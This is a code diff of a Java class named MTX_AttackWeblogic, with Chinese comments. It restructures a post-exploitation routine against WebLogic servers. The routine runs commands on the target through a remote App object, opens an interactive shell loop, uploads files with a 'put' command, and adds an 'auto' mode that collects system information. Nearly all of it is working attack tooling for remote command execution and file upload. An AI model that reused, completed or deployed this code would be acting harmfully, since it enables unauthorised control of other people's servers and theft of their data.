@@ -54,60 +54,9 @@ public class MTX_AttackWeblogic extends InfoLog
 	protected boolean bThreadDel = false, bThreadDelOk = false;
 	// 命令交互
 	protected boolean bInteractive = false;
-	
-	public  void doGetInfo()
+	// 自动执行命令
+	public void doAutoCmd(boolean bWin,String szFile,String s,String []a)
 	{
-		String szFile = "data/" + szServer+"_" + port + ".txt";
-		File fOld = new File(szFile); 
-		// 存在就生成性的文件
-		if(fOld.exists())
-		{
-			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
-//			return;
-		}
-		String s = App.runCmd("cmd.exe /c ver");
-		String []a = null;
-		writeFile(szFile, "1、系统版本信息：\n");
-		final boolean bWin = (null != s && -1 < s.indexOf("Microsoft Windows"));
-		// 命令交互
-		if(bInteractive)
-		{
-			System.out.println("cmd:");
-			String szCmd = "";
-			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
-			try{
-				long i = 1;
-				String s1 = "";
-				String szMyHackFile = null;
-				while(null != (szCmd = br.readLine().trim()))
-				{
-					if("exit".equalsIgnoreCase(szCmd) || "quit".equalsIgnoreCase(szCmd))break;
-					// file upload,文件上传
-					if(szCmd.startsWith("put "))
-					{
-						szCmd = szCmd.substring(4).trim();
-						String []aF = szCmd.split("\\s+");
-						szMyHackFile = InfoLog.getFile(new File(aF[0]));
-						App.putFile(szMyHackFile, aF[1]);
-						System.out.println("Ok:  " + szCmd);
-					}
-					else
-					{
-						if(bWin)szCmd = "cmd.exe /c " + szCmd;
-						s1 = App.runCmd(szCmd);
-						if(null != s && 0 < (s1 = s1.trim()).length())
-						{
-							System.out.println(s1);
-							writeFile(szFile, i+ "、" + szCmd + "：\n" + s1 + "\n");
-						}
-					}
-				}
-			}catch(Exception e){}
-			return;
-		}
-//		String szMyHackFile = InfoLog.getFile(new File("/Users/xiatian/project/sfTester/data/exp.jsp"));
-		
-		
 		if(bWin)
 		{
 			writeFile(szFile, s + "\n");
@@ -400,6 +349,63 @@ public class MTX_AttackWeblogic extends InfoLog
 			 
 			 // 生成下载指令
 		 }
+	}
+	
+	public  void doGetInfo()
+	{
+		String szFile = "data/" + szServer+"_" + port + ".txt";
+		File fOld = new File(szFile); 
+		// 存在就生成性的文件
+		if(fOld.exists())
+		{
+			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
+//			return;
+		}
+		String s = App.runCmd("cmd.exe /c ver");
+		String []a = null;
+		writeFile(szFile, "1、系统版本信息：\n");
+		final boolean bWin = (null != s && -1 < s.indexOf("Microsoft Windows"));
+		// 命令交互
+		if(bInteractive)
+		{
+			System.out.println("cmd:");
+			String szCmd = "";
+			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
+			try{
+				long i = 1;
+				String s1 = "";
+				String szMyHackFile = null;
+				while(null != (szCmd = br.readLine().trim()))
+				{
+					if("exit".equalsIgnoreCase(szCmd) || "quit".equalsIgnoreCase(szCmd))break;
+					// file upload,文件上传
+					if(szCmd.startsWith("put "))
+					{
+						szCmd = szCmd.substring(4).trim();
+						String []aF = szCmd.split("\\s+");
+						szMyHackFile = InfoLog.getFile(new File(aF[0]));
+						App.putFile(szMyHackFile, aF[1]);
+						System.out.println("Ok:  " + szCmd);
+					}
+					else if("auto".equalsIgnoreCase(szCmd))
+					{
+						doAutoCmd(bWin, szFile,s,a);
+					}
+					else if(0 < (szCmd = szCmd.trim()).length())
+					{
+						if(bWin)szCmd = "cmd.exe /c " + szCmd;
+						s1 = App.runCmd(szCmd);
+						if(null != s1)
+						{
+							System.out.println(s1);
+							writeFile(szFile, i+ "、" + szCmd + "：\n" + s1 + "\n");
+						}
+					}
+				}
+			}catch(Exception e){}
+			return;
+		}
+		doAutoCmd(bWin, szFile,s,a);
 	}
 	InitialContext Ic = null;
 	InitApp App = null;
